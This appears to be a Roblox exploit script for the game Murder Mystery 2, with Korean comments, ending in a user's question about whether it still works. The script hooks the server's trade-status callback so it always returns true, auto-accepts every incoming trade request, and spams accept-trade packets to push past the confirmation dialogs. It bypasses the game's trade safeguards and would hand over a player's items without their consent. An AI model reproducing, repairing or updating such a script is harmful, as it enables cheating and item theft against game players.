-- [[ GLOBAL MM2 AUTO-TRADE SYSTEM - JAN 2026 UPDATE ]]
-- Credits: BloxLeak / MM2Stuff
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = game.Players.LocalPlayer
local TradeRemote = ReplicatedStorage:WaitForChild("Trade")

print("📡 [System] Global MM2 Auto-Trade System Active (Jan 2026)")

-- 1. CALLBACK HOOKING (서버의 수락 확인 요청을 가로채서 즉시 응답)
pcall(function()
    local getStatus = TradeRemote:WaitForChild("GetTradeStatus")
    if getStatus:IsA("RemoteFunction") then
        -- 서버가 클라이언트의 의사를 물어볼 때 무조건 true를 반환하여 보안 통과
        getStatus.OnClientInvoke = function()
            return true
        end
    end
end)

-- 2. AUTO-REQUEST ACCEPT (들어오는 거래 요청 즉시 승인)
task.spawn(function()
    while task.wait(0.3) do
        pcall(function()
            -- MM2는 AcceptRequest 신호를 보내면 거래창이 즉시 열림
            TradeRemote.AcceptRequest:FireServer()
        end)
    end
end)

-- 3. PACKET SPAMMER (거래창 감지 후 서버에 수락 패킷 강제 주입)
task.spawn(function()
    while task.wait(0.1) do
        pcall(function()
            local mainGui = LP.PlayerGui.MainGUI
            if mainGui.Trade.Visible then
                -- 버튼 객체를 직접 클릭하지 않고 리모트 이벤트에 직접 데이터 주입
                -- MM2 서버는 (true) 또는 (LocalPlayer) 인자를 기대함
                TradeRemote.AcceptTrade:FireServer(true)
                TradeRemote.AcceptTrade:FireServer(LP)
                
                -- 확인 팝업창(TradeConfirm) 자동 돌파
                if mainGui:FindFirstChild("TradeConfirm") and mainGui.TradeConfirm.Visible then
                    TradeRemote.AcceptTrade:FireServer(true)
                end
            end
            
            -- 보상 획득창(ItemGUI) 자동 닫기 및 최종 확정
            local itemGui = LP.PlayerGui:FindFirstChild("ItemGUI")
            if itemGui and itemGui.Enabled then
                TradeRemote.AcceptTrade:FireServer(true)
                itemGui.Enabled = false
            end
        end)
    end
end)

이거는 기능 막혔어?
